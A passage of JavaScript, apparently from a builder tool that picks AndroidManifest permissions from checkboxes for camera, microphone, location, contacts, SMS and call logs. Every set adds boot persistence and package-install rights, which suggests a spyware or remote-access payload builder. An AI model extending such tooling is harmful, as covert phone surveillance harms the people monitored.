            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         `
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         ` 
        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         `
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            ` 
        }
        //if three are checked 
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>

            ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }



          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
